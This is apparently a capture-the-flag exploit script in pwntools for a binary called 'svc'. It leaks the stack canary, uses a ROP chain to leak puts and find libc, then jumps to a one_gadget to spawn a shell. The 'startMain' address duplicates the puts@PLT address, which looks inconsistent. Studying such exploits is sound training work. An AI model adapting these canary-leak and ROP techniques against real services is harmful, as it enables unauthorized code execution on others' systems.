from pwn import *

target = process('./svc')
# gdb.attach(target, gdbscript='b *0x00400cd3')

target.recvuntil('>>')
target.sendline('1')
target.recvuntil('>>')
target.send('0'*0xa9) # send the input that will display the canary

target.recvuntil('>>')
target.sendline('2')
target.recvuntil('0'*0xa9)
canary = b'\x00' + target.recv(7).rstrip()

print(f'Canary: {canary}')

# test the canary

# target.recvuntil('>>')
# target.sendline('1')
# target.recvuntil('>>')

# target.sendline(bytes('0'*0xa8, 'utf8') + canary)

# target.recvuntil('>>')
# target.sendline('2')
# target.interactive()


# now deduce the right address of our gadget

popRdi = p64(0x400ea3)
gotPuts = p64(0x602018)
pltPuts = p64(0x4008d0)
startMain = p64(0x4008d0) # to loop back at main

putsLeakPayload = bytes('0'*0xa8, 'utf8')
putsLeakPayload += canary
putsLeakPayload += bytes('1'*0x08, 'utf8') # pad until we get to the return address
putsLeakPayload += popRdi
putsLeakPayload += gotPuts
putsLeakPayload += pltPuts
putsLeakPayload += startMain

target.recvuntil('>>')
target.sendline('1')
target.recvuntil('>>')
target.send(putsLeakPayload)

target.recvuntil('>>')
target.sendline('3')
target.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...\n')

putsLeakAddr = target.recvline().rstrip()
putsLeakAddr = u64(putsLeakAddr + b'\x00' * (8 - len(putsLeakAddr)))
print(f'Puts addr: {putsLeakAddr}')

# now compute the actual address of the gadget we want to exploit

elf = ELF('svc')

offsetPuts = 0x875a0
offsetSystem = 0x55410
offsetBinSh = 0x1b75aa

libcBase = putsLeakAddr - 0x875a0
systemLibc = libcBase + offsetSystem
binShLibc = libcBase + offsetBinSh

# Payload from tutorial

# finalPayload = bytes('0'*0xa8, 'utf8')
# finalPayload += canary
# finalPayload += bytes('1'*0x08, 'utf8') # pad until we get to the return address
# finalPayload += popRdi
# finalPayload += p64(binShLibc)
# finalPayload += p64(systemLibc)

# payload using one_gadget

finalPayload2 = bytes('0'*0xa8, 'utf8')
finalPayload2 += canary
finalPayload2 += bytes('1'*0x08, 'utf8') # pad until we get to the return address
finalPayload2 += p64(libcBase + 0xe6c81)


target.recvuntil('>>')
target.sendline('1')
target.recvuntil('>>')
target.send(finalPayload2)

target.recvuntil('>>')
target.sendline('3')

target.interactive()










# payload = b''
# payload += bytes([0]*0xa9)
# payload += canary
# payload += bytes([0] * (0xb8-len(payload)))
# payload += p64(0xe6c81)

# target.sendline(payload)

# target.recvuntil('-------------------------')
# target.sendline('3')

# target.interactive()